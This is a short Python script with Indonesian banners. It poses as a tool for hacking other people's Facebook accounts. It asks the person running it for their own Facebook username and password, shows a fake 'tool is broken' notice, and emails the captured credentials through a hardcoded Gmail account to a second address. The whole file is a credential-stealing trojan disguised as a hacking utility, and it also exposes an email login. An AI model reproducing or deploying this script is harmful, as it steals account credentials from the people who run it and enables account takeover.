# -*- coding: utf-8 -*-
# coding=utf-8
import socket,struct,os,sys,time,yagmail
x=yagmail.SMTP('koklugakjago@gmail.com','kontollaki')
subject='AKUN TARGET MASUK'
logo = """\033[1;94m█████████
\033[1;94m█▄█████▄█      \033[1;94m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;94m█\033[1;94m▼▼▼▼▼ \033[1;94m- _ --_--\033[1;94m╔╦╗┌─┐┬─┐┬┌─   ╔═╗╔╗
\033[1;94m█ \033[1;94m \033[1;94m_-_-- -_ --__\033[1;94m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗
\033[1;94m█\033[1;94m▲▲▲▲▲\033[1;94m--  - _ --\033[1;94m═╩╝┴ ┴┴└─┴ ┴   ╚  ╚═╝ \033[1;97mVVIP
\033[1;94m█████████      \033[1;94m«°°°°°°°°°°✧°°°°°°°°°°»
\033[1;94m ██ ██\x1b[00m"""

banner = """
\x1b[34mHack Facebook orang lain dengan mudah
\x1b[00mHack facebook secara target
\x1b[00mlogin menggunakan akun facebook kalian \x1b[91m!
"""
def main():
        os.system('clear')
        print(logo)
        print(banner)
        print('\x1b[00m\033[41m FACEBOOK LOGIN \033[00m')
        u=input('\x1b[00mUsername: \x1b[33m')
        p=input('\x1b[00mPassword: \x1b[33m')
        msg=('username: '+u+', password: '+p)
        body=(msg)
        print('')
        print('\x1b[00mSorry, Tipis ini sedang rusak\x1b[91m !\x1b[00m')
        print('\x1b[33mPlease jangan gunakan tools ini :) ...')
        os.system('sleep 3')
        print('')
        print('\x1b[00mExiting program \x1b[91m!')
        os.system('exit')
        x.send('s35997949@gmail.com',subject,body)
main()
